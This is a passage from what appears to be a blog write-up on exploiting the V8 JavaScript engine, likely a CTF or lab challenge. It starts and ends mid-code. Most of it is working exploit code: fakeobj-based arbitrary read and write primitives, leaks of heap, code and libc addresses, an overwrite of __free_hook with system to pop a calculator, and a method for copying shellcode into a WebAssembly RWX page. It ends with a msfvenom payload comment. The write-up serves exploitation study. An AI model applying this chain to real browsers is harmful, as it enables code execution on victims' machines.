</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">arb_rw_arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Index 0 will then return the value at read_addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">fake</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">arb_rw_arr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Change the elements pointer using our crafted array to write_addr-0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">arb_rw_arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Write to index 0 as a floating point value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fake</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">val</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// creating an ArrayBuffer holding the value of a 64-bit pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// creating a dataview for the ArrayBuffer object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// retrieving the address of the ArrayBuffer object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// retrieveing the address of the backing_store pointer of the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// ArrayBuffer object located at offset +0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// overwritting the backing_store pointer with the value we desire
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// to overwrite
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#a6e22e">backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// using the dataview to dereference the backing pointer and to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// do the write for us
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">val</span>), <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// syntax: setBigUint64(byteOffset, value, littleEndian)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">test_arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.2</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">test_arr_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">test_arr</span>));
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// found using memory inspection using GDB
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">test_arr_map_segment_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">test_arr_map</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff0000</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">heap_pointer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">test_arr_map_segment_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">16</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">heap_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">heap_pointer</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xaef50</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[+] heap base: 0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">heap_base</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stack_leak</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">heap_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x8ff0</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data_segment_leak</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">stack_leak</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code_segment_leak</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">data_segment_leak</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code_segment_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">code_segment_leak</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x12120</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[+] code base: 0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">code_segment_base</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">first_got_entry</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">code_segment_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0xb2c5e0</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">libc_leak</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">first_got_entry</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">libc_leak</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x4a090</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[+] libc base: 0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">libc_base</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">libc_system</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">libc_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x55410</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[+] libc system: 0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">libc_system</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">libc_free_hook</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">libc_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x1eeb28</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[+] libc __free_hook: 0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">libc_free_hook</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[+] Popping calc...&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">libc_free_hook</span>, <span style="color:#a6e22e">libc_system</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;xcalc&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exploit</span>();</span></span></code></pre></div>
<h3 id="0602---rwx-webassembly-pages">06.02 - RWX WebAssembly pages<a href="#0602---rwx-webassembly-pages" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The previous methodology seems to only work from the d8 shell, however when the exploit is attempted from Chronium, it doesnt seem to work. It looks like the way to conduct the various leaks is not appropiate, as its likely that Chromium may have a different memory layout than the standalone d8 shell. However, there is a more reliable way (without sandboxing) of executing arbitrary code in Chromium using <code>WebAssembly</code> instances, as is possible the <code>RXW</code> memory gets delegated for these  objects. We can see this below:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> vmmap
</span></span><span style="display:flex;"><span>LEGEND: STACK <span style="color:#f92672">|</span> HEAP <span style="color:#f92672">|</span> CODE <span style="color:#f92672">|</span> DATA <span style="color:#f92672">|</span> RWX <span style="color:#f92672">|</span> RODATA
</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">0x69674cbc000</span>      <span style="color:#ae81ff">0x69674cc4000</span> rw<span style="color:#f92672">-</span>p     <span style="color:#ae81ff">8000</span> <span style="color:#ae81ff">0</span>      
</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">0xab4bfd00000</span>      <span style="color:#ae81ff">0xab4bfd01000</span> rw<span style="color:#f92672">-</span>p     <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">0</span>      
</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">0xf4aa4195000</span>      <span style="color:#ae81ff">0xf4aa4196000</span> rwxp     <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">0</span>     <span style="color:#75715e">// &lt;-- RWX page
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">18</span>xg <span style="color:#ae81ff">0x35a4a83e1659</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>                           <span style="color:#75715e">// WASM instance	 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x35a4a83e1658</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00003c19a49c9789</span>	<span style="color:#ae81ff">0x00003fd30acc0c71</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x35a4a83e1668</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00003fd30acc0c71</span>	<span style="color:#ae81ff">0x00007ffdf69f0000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x35a4a83e1678</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000010000</span>	<span style="color:#ae81ff">0x000000000000ffff</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x35a4a83e1688</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000555556355838</span>	<span style="color:#ae81ff">0x00003fd30acc0c71</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x35a4a83e1698</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00005555563e80f0</span>	<span style="color:#ae81ff">0x00003fd30acc04d1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x35a4a83e16a8</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x35a4a83e16b8</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x35a4a83e16c8</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00005555563e8110</span>	<span style="color:#ae81ff">0x00003fd30acc04d1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x35a4a83e16d8</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000055555634bb70</span>	<span style="color:#ae81ff">0x00000f4aa4195000</span>    <span style="color:#75715e">// WASM instance+0x88
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  
</span></span></code></pre></div></p>
<p>We can allocate a WebAssembly instance holding some arbitrary code, copy a shellcode to the WASM instance&rsquo;s dedicated RWX page, to then execute it. We can do this as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>	<span style="color:#75715e">// from https://wasdk.github.io/WasmFiddle/
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_code</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">133</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">96</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">127</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">112</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">145</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">111</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">121</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>]);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_mod</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">wasm_code</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_instance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#a6e22e">wasm_mod</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasm_instance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rwx_page_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">wasm_instance</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x88</span><span style="color:#a6e22e">n</span>);</span></span></code></pre></div>
<p>we can find what the <code>wasm_code</code> value should be by using <a href="https://wasdk.github.io/WasmFiddle">WasmFiddle</a> and finding out the code buffer of a minimal function in <code>C</code>. This would force v8 to allocate a <code>RWX page</code> to hold the <code>WASM</code> instance :</p>
<p><code>C code</code>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<code>WASM code</code>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>(module
</span></span><span style="display:flex;"><span> (table 0 anyfunc)
</span></span><span style="display:flex;"><span> (memory $0 1)
</span></span><span style="display:flex;"><span> (export &#34;memory&#34; (memory $0))
</span></span><span style="display:flex;"><span> (export &#34;main&#34; (func $main))
</span></span><span style="display:flex;"><span> (func $main (; 0 ;) (result i32)
</span></span><span style="display:flex;"><span>  (i32.const 0)
</span></span><span style="display:flex;"><span> )
</span></span><span style="display:flex;"><span>)</span></span></code></pre></div></p>
<p><code>Code buffer</code>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmCode</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(
</span></span><span style="display:flex;"><span>	[
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">133</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">96</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">127</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">112</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">128</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">145</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">109</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">111</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">121</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>
</span></span><span style="display:flex;"><span>	]
</span></span><span style="display:flex;"><span>);</span></span></code></pre></div></p>
<p>The only thing left to do is to write a function to copy our custom shellcode into this <code>RWX</code> page . We can do this by using the <code>ArrayBuffer</code> and <code>DataView</code> objects technique described earlier as follows:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">copy_shellcode</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">shellcode</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#a6e22e">backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">shellcode</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setUint32</span>(<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">shellcode</span>[<span style="color:#a6e22e">i</span>], <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// msfvenom -p linux/x64/exec CMD=&#39;xcalc&#39; --format dword
